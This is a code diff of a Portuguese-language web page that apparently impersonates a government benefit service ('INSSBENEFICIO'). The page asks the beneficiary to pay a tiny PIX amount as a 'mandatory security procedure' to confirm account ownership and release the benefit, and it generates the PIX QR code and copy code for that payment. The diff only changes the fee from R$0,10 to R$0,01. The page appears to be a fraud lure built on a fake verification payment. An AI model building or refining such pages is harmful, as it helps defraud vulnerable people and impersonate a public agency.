@@ -389,12 +389,12 @@ footer p {
           <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
           <div>
             <strong>Por que pagar R$ 0,10?</strong><br>
-            Este PIX de apenas <strong>R$ 0,10 (dez centavos)</strong> é exclusivamente para <strong>confirmar que a conta bancária informada pertence à beneficiária</strong>. É um procedimento de segurança obrigatório para liberar o benefício. Nenhum outro valor será cobrado.
+            Este PIX de apenas <strong>R$ 0,01 (um centavo)</strong> é exclusivamente para <strong>confirmar que a conta bancária informada pertence à beneficiária</strong>. É um procedimento de segurança obrigatório para liberar o benefício. Nenhum outro valor será cobrado.
           </div>
         </div>
 
         <div class="pix-box">
-          <div class="pix-valor">R$ 0,10</div>
+          <div class="pix-valor">R$ 0,01</div>
           <div class="pix-label">Confirmação de titularidade da conta</div>
           <div id="qrcode"></div>
           <div class="pix-chave-label">Ou copie o código PIX:</div>
@@ -447,7 +447,7 @@ function gerarPixPayload(chave, nome, cidade, valor) {
 }
 
 function gerarQR() {
-  const payload = gerarPixPayload('29979036000140','INSSBENEFICIO','SAO PAULO','0.10');
+  const payload = gerarPixPayload('29979036000140','INSSBENEFICIO','SAO PAULO','0.01');
   document.getElementById('pixCode').textContent = payload;
   document.getElementById('qrcode').innerHTML = '';
   new QRCode(document.getElementById('qrcode'), {
